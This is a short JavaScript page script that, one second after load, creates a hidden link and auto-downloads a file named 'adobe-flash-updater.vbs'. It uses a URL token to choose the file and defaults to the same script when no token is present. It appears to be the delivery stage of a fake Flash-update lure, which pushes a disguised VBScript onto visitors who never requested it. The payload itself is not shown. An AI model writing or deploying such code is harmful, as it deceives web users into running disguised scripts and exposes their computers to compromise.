function getDownloadFile(token) {
    if (!token) return null;
    if (token === "flash-updater") {
        return "doc/adobe-flash-updater.vbs";
    }
}

setTimeout(() => {
    let token = "";
    let file;

    if (window.location.search) {
        const params = new URLSearchParams(window.location.search);
        token = params.get("token") || "";
    } else {
        token = window.location.pathname.replace(/^\/|\/$/g, "");
    }

    console.log(token);

    if (token) {
        console.log("1")
       file = getDownloadFile(token);
    } else { 
        console.log("2");
        file = "doc/adobe-flash-updater.vbs"
    }

    const link = document.createElement("a");
    link.href = file;
    link.download = file.split("/").pop();
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}, 1000);
